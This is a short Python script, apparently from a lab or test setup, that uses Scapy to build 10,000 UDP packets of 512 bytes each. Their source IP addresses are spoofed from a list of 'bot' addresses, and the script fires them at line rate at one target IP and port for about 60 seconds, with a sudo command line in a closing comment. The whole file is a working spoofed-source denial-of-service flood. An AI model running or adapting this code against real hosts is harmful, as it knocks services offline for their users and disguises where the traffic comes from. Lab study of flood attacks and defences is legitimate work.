from scapy.all import *
import random
import time
import ipaddress

# Scapy UDP Flood (512 bytes) (60 seconds)
TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "../bots.txt"
PACKET_PAYLOAD_SIZE = 512
NUM_PACKETS = 10000
SEND_DURATION = 60
IFACE = "enp0s3"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_udp_flood_attack():
    bot_ips = load_bots(BOTFILE)
    packets = []

    start_build = time.perf_counter()
    for _ in range(NUM_PACKETS):
        source_ip = random.choice(bot_ips)

        ip_layer  = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)

        payload = b"*" * PACKET_PAYLOAD_SIZE

        packet = eth_layer / ip_layer / udp_layer / Raw(load=payload)
        packets.append(packet)

    end_build = time.perf_counter()
    build_duration = end_build - start_build

    print(f"\nPacket creation completed.")
    print(f"Time to build packets: {build_duration:.4f} seconds")
    print(f"\nSending packets for {SEND_DURATION - build_duration:.4f} seconds...")

    sendpfast(packets, iface=IFACE, file_cache=True, loop=0)

    print(f"\nPacket sending finished.")

if __name__ == "__main__":
    run_udp_flood_attack()

# timeout -s INT 60 sudo PYTHONPATH=$HOME/scapy python3 scapy_test_udp_512bytes_flood.py